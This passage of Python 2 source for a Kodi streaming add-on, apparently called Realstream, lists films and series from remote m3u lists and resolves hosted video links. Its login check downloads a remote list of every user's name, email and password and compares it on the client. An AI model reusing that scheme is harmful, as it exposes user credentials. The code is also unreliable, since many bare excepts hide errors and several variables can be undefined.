			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass	

def top15():

	try:
		
		lista_series = make_request(dbtserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
	
def Lista_Series(): 
	
	try:
		
		lista_series = make_request(dbserie)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_series).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 143, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass

def m3u_playseries(name,url):	

	name = name.encode('utf-8')		
	url = url.replace('"', ' ').replace('&amp;', '&').strip()
	
	content_db = make_request(url)
	match = re.compile(m3u_capitulos).findall(content_db)
	for iconimage, name, fanart, url in match:
		try:
	
			
			Fontcolor = addon.getSetting('Fontcolor')
			name = '[COLOR %s]' % Fontcolor + name + '[/COLOR]'
			add_serie(name, url, 144, iconimage, fanart)

				
		except:
			pass
		
				

def add_serie(name, url, mode, iconimage, fanart):

	try:
            name = name.encode('utf-8')
        except: pass
	
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage="
	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true') 
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok


def PLAYSERIE(name,url):

	try:
		
		consulta = make_request(MasterKey)
		match = re.compile(regex_login).findall(consulta)
		for nombre,correo,clave in match:
			if re.search(claves, clave):
			
				if usuario == nombre and mail == correo and claves == clave:

					try:
												
						if Resolve == 'ResolveUrl':

							play_resolveurl(name,url)
							
							kill_playlist()

						if Resolve == 'UrlResolver':
									
							play_urlresolver(name,url)
							
							kill_playlist()
						
					except:
						pass
	except:
		pass

def search_p(): 


	try:
		
		lista_series = make_request(dbpelicula)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				keyb = xbmc.Keyboard('', 'Buscar')
				keyb.doModal()
				if (keyb.isConfirmed()):
					dp = xbmcgui.DialogProgress()
					dp.create('Realstream:','Buscando ...')
					x = range(0,70)
					for n in x:
						 n = n+1
					searchText = urllib.quote_plus(keyb.getText()).replace('+', ' ')
					content2 = make_request(op)
					match = re.compile(m3u_peliculas).findall(content2)
					for iconimage, name, fanart, url, description in match:
						dp.update(n ,'[COLOR orange]Realstream: Buscando ...[/COLOR]', '[COLOR gold] %s [/COLOR]' % name)
						xbmc.sleep(5)
						if dp.iscanceled(): break;
						if re.search(searchText, removeAccents(name.replace(' ', ' ')), re.IGNORECASE):

							xbmc.executebuiltin("XBMC.Notification(Real Stream, Generando listado ...  [COLOR orange] Por favor espere ![/COLOR] , 3000)")
							add_dir2(name, url, 147, iconimage, fanart, description)
							dp.update(100 ,'[COLOR orange]Realstream: [/COLOR]', '[COLOR gold] Busqueda finalizada ...[/COLOR]')
							xbmc.sleep(500)
							dp.close()
					add_dir('[COLOR %s]Buscar Pelicula[/COLOR]' % MenuColor,'search',146,Mb_peliculas,fanart)
					xbmc.executebuiltin("XBMC.Notification(Real Stream, Sin Resultados para: [COLOR orange]" +searchText+ "[/COLOR] , 2000)")

			
			except: add_dir('[COLOR %s]Buscar Pelicula[/COLOR]' % MenuColor,'search',146,Mb_peliculas,fanart)
		
	except: 
		pass
		
def Lista_Peliculas(): 
	
	try:
		
		lista_series = make_request(dbpelicula)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		

		
def Lista_novedades(): 
	
	try:
		
		lista_series = make_request(dbnovedades)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def Lista_Familiar(): 
	
	try:
		
		lista_familiar = make_request(dbfamiliar)
		match = re.compile(mydb).findall(lista_familiar)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def Lista_estrenos(): 
	
	try:
		
		lista_series = make_request(dbestrenos)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def Lista_Superheroes(): 
	
	try:
		
		lista_superheroes = make_request(dbsuperheroes)
		match = re.compile(mydb).findall(lista_superheroes)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def Lista_Gpelis(): 
	
	try:
		
		lista_series = make_request(dbgpelis)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def Lista_clasico(): 
	
	try:
		
		lista_series = make_request(dbclasico)
		match = re.compile(mydb).findall(lista_series)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass
				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def lista_animacion():

	try:
		
		content = make_request(dbanimacion)
		match = re.compile(mydb).findall(content)
		for m3u in match:
		
			try:
		
				op = m3u
				
			except:
				pass	
		

				
		content2 = make_request(op)
		match = re.compile(m3u_peliculas).findall(content2)
		for iconimage, name, fanart, url, description in match:
			try:
				
				add_dir2(name, url, 147, iconimage, fanart, description)
			
			except:
				pass
	except:
		pass
		
def m3u_pelicula(name,url):
	
	name = name.encode('utf-8')		
	url = url.replace('"', ' ').replace('&amp;', '&').strip()
	
	content_db = make_request(url)
	match = re.compile(m3u_servidores).findall(content_db)
	for iconimage, name, fanart, url, id in match:
		try:
	
			Fontcolor = addon.getSetting('Fontcolor')
			name = '[COLOR %s]' % Fontcolor + name + '[/COLOR]'
			add_pelicula(name, url, 130, iconimage, fanart, id)

				
		except:
			pass
			
def add_pelicula(name, url, mode, iconimage, fanart, id):

	try:
            name = name.encode('utf-8')
        except: pass
	
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + "&id=" + str(id)
	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true') 
	commands=[]
	if xbmc.getCondVisibility('System.HasAddon(script.extendedinfo)'):
		commands.append(("[B][COLOR yellow]ExtendedInfo[/COLOR][/B]","XBMC.RunScript(script.extendedinfo,info=extendedinfo,name=%s,id=%s)" % (name,id) ))

		liz.addContextMenuItems(commands, replaceItems=True)	
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok
	
def get_info_movie():

    # prompt the user to input search text
    kb = xbmc.Keyboard('', 'Titulo de la pelicula')
    kb.doModal()
    if not kb.isConfirmed():
        return None;
    name = kb.getText().strip()
	

    if xbmc.getCondVisibility('system.platform.android'):
	
	opensite = xbmc.executebuiltin( 'StartAndroidActivity(,android.intent.action.VIEW,,%s)' % ( 'https://www.themoviedb.org/search?query=' +name+ '&language=es-ES'  ) )
	
        
	return 'android'

    elif xbmc.getCondVisibility('system.platform.windows'):
	
	opensite = webbrowser . open('https://www.themoviedb.org/search?query=' +name+ '&language=es-ES')
  
	
	return 'windows'
	


			
def video_tutoriales(): 
	
	try:
		
		content = make_request(db24)
		match = re.compile(mydb).findall(content)
		for m3u in match:
		
			try:
		
				op24 = m3u
				
			except:
				pass
		content = make_request(op24)
		match = re.compile(tutoriales_regex).findall(content)
		for thumb, name, url in match:
			try:
				m3u_videotutoriales(thumb, name, url)
			
			except:
				pass
				
	except:
		pass



def m3u_videotutoriales(thumb, name, url):	
## despues de obtener las url de la lista m3u las muestra.
	name = re.sub('\s+', ' ', name).strip()	
	
	url = url.replace('"', ' ').replace('&amp;', '&').strip()
	if ('youtube.com/user/' in url) or ('youtube.com/channel/' in url) or ('youtube/user/' in url) or ('youtube/channel/' in url):
		if 'tvg-logo' in thumb:				
			thumb = re.compile(m3u_thumb_regex).findall(str(thumb))[0].replace(' ', '%20')
		else:	
			add_dir(name, url, '', icon, fanart)
	else:
		name = '[COLOR white]%s[/COLOR]' % name
			
		if 'tvg-logo' in thumb:				
			thumb = re.compile(m3u_thumb_regex).findall(str(thumb))[0].replace(' ', '%20')
			
			add_video(name, url, 4, iconimage, fanart)

		else:
		
			add_video(name, url, 4, iconimage, fanart)	

def m3u_playlist(name, url, thumb, id, trailer):	
## despues de obtener las url de la lista m3u las muestra.
	name = name.encode('utf-8')		
	url = url.replace('"', ' ').replace('&amp;', '&').strip()
	trailer = trailer.replace('"', ' ').replace('&amp;', '&').strip()
		
	if ('youtube.com/user/' in url) or ('youtube.com/channel/' in url) or ('youtube/user/' in url) or ('youtube/channel/' in url):
		if 'tvg-logo' in thumb:				
			thumb = re.compile(m3u_thumb_regex).findall(str(thumb))[0].replace(' ', '%20')
		else:	
			add_dir(name, url, '', icon, fanart)
	else:
			Fontcolor = addon.getSetting('Fontcolor')
			
			name = '[COLOR %s]' % Fontcolor + name + '[/COLOR]'
			
			if 'tvg-logo' in thumb:				
				thumb = re.compile(m3u_thumb_regex).findall(str(thumb))[0].replace(' ', '%20')
				selecton = addon.getSetting('selecton')
				if selecton == 'true':
					
					add_link(name, url, 1, thumb, thumb, id, trailer)
					
				else:
				
					add_link(name, url, 130, thumb, thumb, id, trailer)

			else:
			
				if selecton == 'true':
					
					add_link(name, url, 1, thumb, thumb, id, trailer)
					
				else:
				
					add_link(name, url, 130, thumb, thumb, id, trailer)	

def m3u_playlist2(name, url, thumb, id, trailer, description, fanart):	
## despues de obtener las url de la lista m3u las muestra.

	url = url.replace('"', ' ').replace('&amp;', '&').strip()
	trailer = trailer.replace('"', ' ').strip()
	Fontcolor = addon.getSetting('Fontcolor')
	fanart = fanart.replace('"', ' ').replace('&amp;', '&').strip()
	name = '[COLOR %s]' % Fontcolor + name + '[/COLOR]'

			
	if 'tvg-logo' in thumb:				
		thumb = re.compile(m3u_thumb_regex).findall(str(thumb))[0].replace(' ', '%20')
		if selecton == 'true':
			add_link2(name, url, 1, thumb, fanart, id, trailer, description)
		else:
				
			add_link2(name, url, 130, thumb, fanart, id, trailer, description)
						
	else:
		
		if selecton == 'true':
					
			add_link2(name, url, 1, thumb, fanart, id, trailer, description)
					
		else:
				
			add_link2(name, url, 130, thumb, fanart, id, trailer, description)

	        
def play_video(name,trailer):

	if notificar == 'true':	
		xbmc.executebuiltin("XBMC.Notification(Realstream, Reproduciendo Trailer de: [COLOR green]" +name+ "[/COLOR] ,5000)")

		url = 'plugin://plugin.video.youtube/play/?video_id=%s' % trailer
		media_url = url
		item = xbmcgui.ListItem(name, trailer, path = media_url)
		xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
	else:
		url = 'plugin://plugin.video.youtube/play/?video_id=%s' % trailer
		media_url = url
		item = xbmcgui.ListItem(name, trailer, path = media_url)
		xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
		
		
def play_box(name,url):

	if notificar == 'true':	
	
		try:
						
			dp = xbmcgui.DialogProgress()
			dp.create('Realstream:','Iniciando ...')
			dp.update(30,'Realstream:','Conectando al servidor ...')
			xbmc.sleep(1000)
			dp.update(75,'RESOLVEURL:','Resolviendo enlace ...')
			xbmc.sleep(500)
			dp.update(100,'RESOLVEURL:','Disfrute de la pelicula!')
			dp.close()
		
			media_url = url
			item = xbmcgui.ListItem(name, path = media_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
			
		except: xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace borrado o no encontrado. ,3000)")  
		
	else:
	
		try:
	
			dp = xbmcgui.DialogProgress()
			dp.create('Realstream:','Iniciando ...')
			dp.update(30,'Realstream:','Conectando al servidor ...')
			xbmc.sleep(1000)
			dp.update(75,'RESOLVEURL:','Resolviendo enlace ...')
			xbmc.sleep(500)
			dp.update(100,'RESOLVEURL:','Disfrute de la pelicula!')
			dp.close()
	
			media_url = url
			item = xbmcgui.ListItem(name, path = media_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
			
		except: xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace borrado o no encontrado. ,3000)") 
		
	return
		
		
def play_TRAILER(trailer):

	if 'https://www.youtube.com' in trailer:
	
		try:
	
			import resolveurl
		
			hmf = resolveurl.HostedMediaFile(url)
			dp = xbmcgui.DialogProgress()
			dp.create('Realstream:','Conectando al servidor ... ')
			dp.update(20,'Por favor, espere ...')
			xbmc.sleep(500)
		
			if not hmf:
				xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace borrado o no encontrado. Prueba a reiniciar el router o poner una VPN. ,5000)")            
				return False

			try:
			
				dp.update(50,'RESOLVEURL:','Comprobando que existe el enlace.')
				xbmc.sleep(500)
				stream_url = hmf.resolve()
				if not stream_url or not isinstance(stream_url, basestring):
					try: msg = stream_url.msg
					except: msg = stream_url
					raise Exception(msg)
			except Exception as e:
				try: msg = str(e)
				except: msg = stream_url
				dp.update(100,'RESOLVEURL:','Enlace borrado o no es accesible con tu actual IP. Cambia de ip o reinicia tu Router.')
				dp.close()
				xbmc.executebuiltin("XBMC.Notification(Real Stream,Enlace borrado o no encontrado. Prueba a reiniciar el router o poner una VPN. ,5000)")            

			dp.update(50,'RESOLVEURL:','Comprobando si existe el enlace.')
			xbmc.sleep(500)
			dp.update(75,'RESOLVEURL:','Resolviendo enlace ...')
			xbmc.sleep(500)
			dp.update(95,'RESOLVEURL:','Encontrado ...')
			xbmc.sleep(500)
			dp.update(100,'RESOLVEURL:','Disfrute de la pelicula!')
			dp.close()

			listitem = xbmcgui.ListItem(path=stream_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, listitem)
		
		except:
			pass

		else:
		
			url = 'plugin://plugin.video.youtube/play/?video_id=%s' % trailer
			media_url = url
			item = xbmcgui.ListItem(trailer, path = media_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
			return

def PLAYVIDEO(name,url):

		if '[Youtube]' in name:
		
			url = 'plugin://plugin.video.youtube/play/?video_id=%s' % url
			media_url = url
			item = xbmcgui.ListItem(trailer, path = media_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, item)
	
			
		else:
		
			import resolveurl
		
			hmf = resolveurl.HostedMediaFile(url)

			if not hmf:
				xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace no soportado para: [COLOR orange]" +name+ "[/COLOR] ,7500)")
				return False


			try:
				stream_url = hmf.resolve()
				if not stream_url or not isinstance(stream_url, basestring):
					try: msg = stream_url.msg
					except: msg = url
					raise Exception(msg)
			except Exception as e:
				try: msg = str(e)
				except: msg = url
				xbmc.executebuiltin("XBMC.Notification(Real Stream, [COLOR red]Enlace no encontrado:[/COLOR] [COLOR orange]" +name+ "[/COLOR] ,7500)")            
				return False
   
			notificar = addon.getSetting('notificar')
			if notificar == 'true':
				xbmc.executebuiltin("XBMC.Notification(Real Stream,[COLOR lime] reproduciendo: [/COLOR][COLOR orange]" +name+ "[/COLOR] ,7500)")	
			listitem = xbmcgui.ListItem(path=stream_url)
			xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, listitem)

		
		return
		
def PLAY(name,url):	
	
	import urlresolver
	from urlresolver import common
    
	hmf = urlresolver.HostedMediaFile(url)

	if not hmf:
		xbmc.executebuiltin("XBMC.Notification([COLOR yellow]Realstream[/COLOR], Enlace no soportado para: [COLOR orange]" +name+ "[/COLOR] ,7500)")
		return False


	try:
		stream_url = hmf.resolve()
		if not stream_url or not isinstance(stream_url, basestring):
			try: msg = stream_url.msg
			except: msg = url
			raise Exception(msg)
	except Exception as e:
		try: msg = str(e)
		except: msg = url
		xbmc.executebuiltin("XBMC.Notification([COLOR yellow]Realstream[/COLOR], [COLOR red]Enlace no encontrado:[/COLOR] [COLOR orange]" +name+ "[/COLOR] ,7500)")            
		return False
   

	xbmc.executebuiltin("XBMC.Notification([COLOR yellow]Realstream[/COLOR],[COLOR lime] reproduciendo: [/COLOR][COLOR orange]" +name+ "[/COLOR] ,7500)")	
	listitem = xbmcgui.ListItem(path=stream_url)
	xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, listitem)

def play_resolveurl(name,url):
					

	import resolveurl
		
	hmf = resolveurl.HostedMediaFile(url)
		
	if not hmf:
		xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace no soportado para: [COLOR orange]" +name+ "[/COLOR] ,5000)")
		return False

	try:
	
		dp = xbmcgui.DialogProgress()
		dp.create('Realstream:','Iniciando ...')
		dp.update(30,'RESOLVEURL:','Conectando al servidor ...')
		xbmc.sleep(1000)
		stream_url = hmf.resolve()
		
		if not stream_url or not isinstance(stream_url, basestring):
			try: msg = stream_url.msg
			except: msg = url
			raise Exception(msg)
					
	except Exception as e:
						
		try: msg = str(e)
		except: msg = url
						
		dp.update(45,'RESOLVEURL:','Reiniciando ... ')
		xbmc.sleep(1000)
		xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace no disponible.  ,3000)")            
		dp.close()
						
	dp.update(60,'RESOLVEURL:','Comprobando que existe el enlace.')
	xbmc.sleep(500)
	dp.update(75,'RESOLVEURL:','Resolviendo enlace ...')
	xbmc.sleep(500)
	dp.update(95,'RESOLVEURL:','Encontrado ...')
	xbmc.sleep(500)
	dp.update(100,'RESOLVEURL:','Lanzando Streaming!')
	dp.close()
	
	notificar = addon.getSetting('notificar')
	listitem = xbmcgui.ListItem(path=stream_url)
	xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, listitem)

		
def play_urlresolver(name,url):


	import urlresolver
	from urlresolver import common
    
	hmf = urlresolver.HostedMediaFile(url)
		
	if not hmf:
		xbmc.executebuiltin("XBMC.Notification(Real Stream, Enlace no soportado para: [COLOR orange]" +name+ "[/COLOR] ,5000)")
		return False

	try:
						
		dp = xbmcgui.DialogProgress()
		dp.create('Realstream:','Iniciando ...')
		dp.update(30,'URLRESOLVER:','Conectando al servidor ...')
		xbmc.sleep(1000)
		stream_url = hmf.resolve()
		
		if not stream_url or not isinstance(stream_url, basestring):
			try: msg = stream_url.msg
			except: msg = url
			raise Exception(msg)
					
	except Exception as e:
						
		try: msg = str(e)
		except: msg = url
			
		dp.update(45,'URLRESOLVER:','Reiniciando ... ')
		xbmc.sleep(1000)
		xbmc.executebuiltin("XBMC.Notification(Real Stream, enlace no disponible.  ,3000)")            
		dp.close()
						
	dp.update(60,'URLRESOLVER:','Comprobando que existe el enlace.')
	xbmc.sleep(500)
	dp.update(75,'URLRESOLVER:','Resolviendo enlace ...')
	xbmc.sleep(500)
	dp.update(95,'URLRESOLVER:','Encontrado ...')
	xbmc.sleep(500)
	dp.update(100,'URLRESOLVER:','Lanzando streaming !')
	dp.close()
	notificar = addon.getSetting('notificar')
	listitem = xbmcgui.ListItem(path=stream_url)
	xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, listitem)


def PLAYVIDEO7(name,url):

	try:

		consulta = make_request(MasterKey)
		match = re.compile(regex_login).findall(consulta)
		for nombre,correo,clave in match:
			if re.search(claves, clave):
		
				if usuario == nombre and mail == correo and claves == clave:

					try:
												
						if Resolve == 'ResolveUrl':

							play_resolveurl(name,url)
							
							kill_playlist()

						if Resolve == 'UrlResolver':
									
							play_urlresolver(name,url)
							
							kill_playlist()
							
					except:
						pass

	except: 
		pass

def get_params():

	param = []
	paramstring = sys.argv[2]
	if len(paramstring)>= 2:
		params = sys.argv[2]
		cleanedparams = params.replace('?', '')
		if (params[len(params)-1] == '/'):
			params = params[0:len(params)-2]
		pairsofparams = cleanedparams.split('&')
		param = {}
		for i in range(len(pairsofparams)):
			splitparams = {}
			splitparams = pairsofparams[i].split('=')
			if (len(splitparams)) == 2:
				param[splitparams[0]] = splitparams[1]
	return param
	
	
def resolver_settings():
    try:
        import resolveurl
        xbmcaddon.Addon('script.module.resolveurl').openSettings()
    except:
		pass

def ThemovieDB():
    dialog = xbmcgui.Dialog()
    list = (
        opc1,
        opc2
        )
        
    call = dialog.select('[B][COLOR=orange]The Movie db[/COLOR][/B]', [
	'[COLOR=%s]Accede a themoviedb.com[/COLOR]' % MenuColor, 
    
	'[B][COLOR=white]                           Volver al Menu [/COLOR][/B]',])

    if call:
        # esc is not pressed
        if call < 0:
            return
        func = list[call-2]
        return func()
    else:
        func = list[call]
        return func()
    return 

def platform():
    if xbmc.getCondVisibility('system.platform.android'):
        return 'android'
    elif xbmc.getCondVisibility('system.platform.linux'):
        return 'linux'
    elif xbmc.getCondVisibility('system.platform.windows'):
        return 'windows'
    elif xbmc.getCondVisibility('system.platform.osx'):
        return 'osx'
    elif xbmc.getCondVisibility('system.platform.atv2'):
        return 'atv2'
    elif xbmc.getCondVisibility('system.platform.ios'):
        return 'ios'

myplatform = platform()

def opc1():
    if myplatform == 'android': # Android 
        opensite = xbmc.executebuiltin( 'StartAndroidActivity(,android.intent.action.VIEW,,%s)' % ( 'https://www.themoviedb.org/movie/' ) )
    else:
        opensite = webbrowser . open('https://www.themoviedb.org/movie/')

        
def opc2():

    main()
	
	
	
def PAIR():
    dialog = xbmcgui.Dialog()
    funcs = (
        functionA,
        functionB
        )
        
    call = dialog.select('[B][COLOR=yellow]Autoriza tu dispositivo[/COLOR][/B]', [
	'[COLOR=orange]                       Pair OpenLoad [/COLOR]', 
    
	'[B][COLOR=lime]                           Volver al Menu [/COLOR][/B]',])

    if call:
        # esc is not pressed
        if call < 0:
            return
        func = funcs[call-2]
        return func()
    else:
        func = funcs[call]
        return func()
    return 

def platform():
    if xbmc.getCondVisibility('system.platform.android'):
        return 'android'
    elif xbmc.getCondVisibility('system.platform.linux'):
        return 'linux'
    elif xbmc.getCondVisibility('system.platform.windows'):
        return 'windows'
    elif xbmc.getCondVisibility('system.platform.osx'):
        return 'osx'
    elif xbmc.getCondVisibility('system.platform.atv2'):
        return 'atv2'
    elif xbmc.getCondVisibility('system.platform.ios'):
        return 'ios'

myplatform = platform()

def functionA():
    if myplatform == 'android': # Android 
        opensite = xbmc.executebuiltin( 'StartAndroidActivity(,android.intent.action.VIEW,,%s)' % ( 'https://olpair.com/' ) )
    else:
        opensite = webbrowser . open('https://olpair.com/')

        
def functionB():

    main()
	

def selector(name, url, id, trailer):
    dialog = xbmcgui.Dialog()
    funcs = (
        function1,
		play_trailer,
		function2,
		ThemovieDB,
		functionsalir
        )
        
    call = dialog.select('[COLOR=orange]REAL STREAM MENU:[/COLOR]', [
	
	'[COLOR=%s]                                                 [B]Ver Pelicula[/B] [/COLOR]' % MenuColor, 
		
	'[COLOR=%s]                                                   [B]Ver Trailer[/B][/COLOR]' % MenuColor,
    
	'[COLOR=%s]                                          [B]Abrir informacion extendida  [/B][/COLOR]' % MenuColor,
	
	'[COLOR=%s]                                           [B]Accede a la web MovieDB[/B][/COLOR]' % MenuColor,
	
	'[COLOR=%s]                                                     [B]Salir[/B][/COLOR]' % MenuColor])

    if call:
        # esc is not pressed
        if call < 0:
            return
        func = funcs[call-5]
        return func()
    else:
        func = funcs[call]
        return func()
    return 



def function1():
    
	PLAYVIDEO7(name,url)
		
def play_trailer():

	play_video(name,trailer)
		
def function2():
    
    if xbmc.getCondVisibility('System.HasAddon(script.extendedinfo)'):
	movie_id = id
	
	xbmc.executebuiltin( "RunScript(script.extendedinfo,info=extendedinfo,id=%s)" % movie_id )

    if notificar == 'true':	
	
		xbmc.executebuiltin("XBMC.Notification(Extended Info,Abriendo: [COLOR green]" +name+ "[/COLOR] ,5000)")
	
def goThemovieDB():

    ThemovieDB()
	
def functionsalir():

    menu()	
def add_dir(name, url, mode, iconimage, fanart):
## Añadre los directorios del menu. Con sus respetivos iconos y fanart y los enlaces a las acciones a enprender por el addon.
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage)
	ok = True
	liz = xbmcgui.ListItem(name, iconImage = "DefaultFolder.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	if ('youtube.com/user/' in url) or ('youtube.com/channel/' in url) or ('youtube/user/' in url) or ('youtube/channel/' in url):
		u = 'plugin://plugin.video.youtube/%s/%s/' % (url.split( '/' )[-2], url.split( '/' )[-1])
		ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz, isFolder = True)
		return ok		
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz, isFolder = True)
	return ok
	
def add_dir2(name, url, mode, iconimage, fanart, description):
## Añadre los directorios del menu. Con sus respetivos iconos y fanart y los enlaces a las acciones a enprender por el addon.
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage)
	ok = True
	liz = xbmcgui.ListItem(name, iconImage = "DefaultFolder.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name, "Plot": description } )
	liz.setProperty('fanart_image', fanart)	
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz, isFolder = True)
	return ok
	
def add_dir3(name, url, mode, iconimage):
## Añadre los directorios del menu. Con sus respetivos iconos y fanart y los enlaces a las acciones a enprender por el addon.
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage)
	ok = True
	liz = xbmcgui.ListItem(name, iconImage = "DefaultFolder.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name, "Plot": description } )
	liz.setProperty('fanart_image', fanart)	
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz, isFolder = True)
	return ok
	
	
def add_link(name, url, mode, iconimage, fanart, id, trailer):
	
	pluginname = 'cGx1Z2luLnZpZGVvLlJlYWwuc3RyZWFt'.decode('\x62\x61\x73\x65\x36\x34')
	
	try:
            name = name.encode('utf-8')
        except: pass
	commands=[]
	
	commands.append(("Reproducir Trailer","XBMC.RunPlugin(plugin://plugin.video.youtube/play/?video_id=%s)" % (trailer)))
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage) + "&id=" + str(id) + "&trailer=" + urllib.quote_plus(trailer)
	liz = xbmcgui.ListItem(name, iconImage = "DefaultVideo.png", thumbnailImage = iconimage)
	liz.setInfo( type = "Video", infoLabels = { "Title": name } )
	liz.setProperty('fanart_image', fanart)
	liz.setProperty('IsPlayable', 'true')

	if xbmc.getCondVisibility('System.HasAddon(script.extendedinfo)'):
		commands.append(("[B][COLOR yellow]ExtendedInfo[/COLOR][/B]","XBMC.RunScript(script.extendedinfo,info=extendedinfo,name=%s,id=%s)" % (name,id) ))

		liz.addContextMenuItems(commands, replaceItems=True)
	ok = xbmcplugin.addDirectoryItem(handle = int(sys.argv[1]), url = u, listitem = liz)
	return ok
	

def add_link2(name, url, mode, iconimage, fanart, id, trailer, description):
	
	pluginname = 'cGx1Z2luLnZpZGVvLlJlYWwuc3RyZWFt'.decode('\x62\x61\x73\x65\x36\x34')
	
	try:
            name = name.encode('utf-8')
        except: pass
	commands=[]
	
	commands.append(("Reproducir Trailer","XBMC.RunPlugin(plugin://plugin.video.youtube/play/?video_id=%s)" % (trailer)))
	u = sys.argv[0] + "?url=" + urllib.quote_plus(url) + "&mode=" + str(mode) + "&name=" + urllib.quote_plus(name) + "&iconimage=" + urllib.quote_plus(iconimage) + "&id=" + str(id) + "&trailer=" + urllib.quote_plus(trailer)
